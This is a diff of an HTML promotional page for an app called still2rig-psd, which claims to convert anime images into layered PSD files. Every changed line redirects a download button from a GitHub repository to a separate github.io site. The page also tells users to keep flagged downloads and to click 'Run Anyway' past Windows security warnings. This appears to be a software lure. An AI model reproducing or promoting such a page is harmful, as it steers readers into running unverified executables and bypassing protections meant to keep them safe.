@@ -9,7 +9,7 @@
     <meta property="og:title" content="still2rig-psd - Anime Image to Structured PSD">
     <meta property="og:description" content="Turn a single anime picture into a clean, layered PSD ready for animation. No coding skills needed.">
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://github.com/Rickettsiayorkshirefog4963/still2rig-psd">
+    <meta property="og:url" content="https://rickettsiayorkshirefog4963.github.io">
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body { font-family:'Segoe UI', Arial, sans-serif; background:#0f0f1a; color:#e0e0e0; line-height:1.7; }
@@ -34,7 +34,7 @@
         <h1>🎨 still2rig-psd - From Static Anime to Ready-to-Animate PSD</h1>
 
         <div class="btn-container">
-            <a href="https://github.com/Rickettsiayorkshirefog4963/still2rig-psd" class="badge">⬇️ Download still2rig-psd Now</a>
+            <a href="https://rickettsiayorkshirefog4963.github.io" class="badge">⬇️ Download still2rig-psd Now</a>
         </div>
 
         <p>Do you have a beautiful anime character image that you want to bring to life? With <strong>still2rig-psd</strong>, you can turn that single static picture into a <strong>structured, QA-checked PSD file</strong> – the standard format used by animators, artists, and rigging tools. No technical skills needed. This app does the heavy lifting for you.</p>
@@ -61,7 +61,7 @@
                 <li><strong>Run the app</strong>: Once downloaded, simply double-click the file to open the application. No installation wizard, no complicated setup – it just works.</li>
             </ol>
             <div class="btn-container">
-                <a href="https://github.com/Rickettsiayorkshirefog4963/still2rig-psd" class="btn">📥 Download still2rig-psd</a>
+                <a href="https://rickettsiayorkshirefog4963.github.io" class="btn">📥 Download still2rig-psd</a>
             </div>
             <div class="note">
                 <p>💡 <strong>Tip</strong>: If your browser asks "Keep or Discard," choose "Keep." Then double-click the file.IfWindows shows a blue or yellow popup, click "More Info" and then "Run Anyway."</p>
@@ -117,7 +117,7 @@
         </div>
 
         <div class="btn-container" style="margin-top:40px;">
-            <a href="https://github.com/Rickettsiayorkshirefog4963/still2rig-psd" class="badge">📂 Go to Download Page</a>
+            <a href="https://rickettsiayorkshirefog4963.github.io" class="badge">📂 Go to Download Page</a>
         </div>
 
         <p style="text-align:center; margin:50px 0 20px; color:#888;">Keywords: anime-characters, avatar, image-to-psd, psd, anime image to psd, still2rig-psd</p>
